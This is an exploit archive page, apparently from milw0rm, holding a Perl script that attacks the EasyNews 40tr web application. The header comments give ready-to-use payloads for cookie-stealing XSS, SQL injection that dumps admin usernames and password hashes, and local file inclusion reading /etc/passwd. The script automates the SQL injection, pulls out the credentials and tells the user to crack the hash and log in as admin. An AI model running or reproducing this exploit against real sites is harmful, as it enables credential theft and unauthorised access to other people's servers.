<html><head><title>EasyNews 40tr (SQL/XSS/LFI) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#####################################################################################
####                               EasyNews-40tr                                 ####
####        Multiple Remote Vulnerabilities (SQL Injection Exploit/XSS/LFI)      ####
#####################################################################################
#                                                                                   #
#Discovered by : IRCRASH By Dr.Crash                                                #
#Exploited By : Dr.Crash                                                            #
#IRCRASH Team Members : Dr.Crash - Malc0de - R3d.w0rm                               #
#                                                                                   #
#####################################################################################
#                                                                                   #
#Script Download : http://myiosoft.com/download/EasyNews/easynews-40tr.zip          #
#                                                                                   #
#####################################################################################
#                                   &lt; XSS &gt;                                         #
#XSS Address : http://Sitename/staticpages/easypublish/index.php?PageSection=0&amp;page=individual&amp;table=edp_pupublish&amp;read=&lt;script&gt;alert(document.cookie);&lt;/script&gt;
#                                                                                   #
#####################################################################################
#                                   &lt; SQL &gt;                                         #
#SQL Address : http://Sitename/dynamicpages/index.php?PageSection=7&amp;page=individual&amp;table=edp_Help_Internal_News&amp;read=1+union+all+select+1,2,3,4,concat(0x4c6f67696e3a,puUsername,0x3c656e64757365723e,0x0d0a50617373776f72643a,puPassword,0x3c656e64706173733e),6+from+edp_puusers
#                                                                                   #
#####################################################################################
#                                   &lt; LFI &gt;                                         #
#SQL Address : http://Sitename/admin/login.php?lang=/../../../../../../../../../../../../../../../etc/passwd%00
#                                                                                   #
#####################################################################################
#                         Our site : Http://IRCRASH.COM                             #
#####################################################################################

use LWP;
use HTTP::Request;
use Getopt::Long;
 
 
sub header
{
print &quot;
****************************************************
*       EasyNews-40tr Sql Injection exploit        *
****************************************************
*AUTHOR : IRCRASH                                  *
*Discovered by : IRCRASH TEAM BY Dr.Crash          *
*Exploited by : IRCRASH TEAM BY Dr.Crash           *
*Our Site : IRCRASH.COM                            *
****************************************************&quot;;
}
 
sub usage
{
  print &quot;
* Usage : perl $0 -url http://Sitename/
****************************************************
&quot;;
}                                                                                  
 
 
my %parameter = ();
GetOptions(\%parameter, &quot;url=s&quot;);
 
$url = $parameter{&quot;url&quot;};
 
if(!$url)
{
header();
usage();
exit;
}
if($url !~ /\//){$url = $url.&quot;/&quot;;}
if($url !~ /http:\/\//){$url = &quot;http://&quot;.$url;}
$vul = &quot;/dynamicpages/index.php?PageSection=7&amp;page=individual&amp;table=edp_Help_Internal_News&amp;read=1+union+all+select+1,2,3,4,concat(0x4c6f67696e3a,puUsername,0x3c656e64757365723e,0x0d0a50617373776f72643a,puPassword,0x3c656e64706173733e),6+from+edp_puusers&quot;;
sub Exploit()
{
$requestpage = $url.$vul;
print &quot;Requesting Page is &quot;.$url.&quot;\n&quot;;
 
my $req  = HTTP::Request-&gt;new(&quot;POST&quot;,$requestpage);
$ua = LWP::UserAgent-&gt;new;
$ua-&gt;agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req-&gt;referer($url);
$req-&gt;referer(&quot;IRCRASH.COM&quot;);
$req-&gt;content_type('application/x-www-form-urlencoded');
$req-&gt;header(&quot;content-length&quot; =&gt; $contlen);
$req-&gt;content($poststring);
 
$response = $ua-&gt;request($req);
$content = $response-&gt;content;
$header = $response-&gt;headers_as_string();
 
#Debug Modus delete # at beginning of next line
#print $content;
 
@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/&lt;enduser&gt;/,$name);
$name = @name[0];
 
@password = split(/Password:/,$content);
$password = @password[1];
@password = split(/&lt;endpass&gt;/,$password);
$password = @password[0];

if(!$name &amp;&amp; !$password)
{
print &quot;\n\n&quot;;
print &quot;!Exploit failed ! :(\n\n&quot;;
exit;
}
 
print &quot;Username: &quot;.$name.&quot;\n&quot;;
print &quot;Password: &quot; .$password.&quot;\n\n&quot;;
print &quot;Crack Md5 Password And Login In : $url/admin/\n&quot;;
print &quot;Enjoy My friend .....\n&quot;;
 
}
 
#Starting;
print &quot;
****************************************************
*       EasyNews-40tr Sql Injection exploit        *
****************************************************
*AUTHOR : IRCRASH                                  *
*Discovered by : IRCRASH TEAM BY Dr.Crash          *
*Exploited by : IRCRASH TEAM BY Dr.Crash           *
****************************************************&quot;;
print &quot;\n\nExploiting...\n&quot;;
Exploit();

# milw0rm.com [2008-04-01]</pre></html>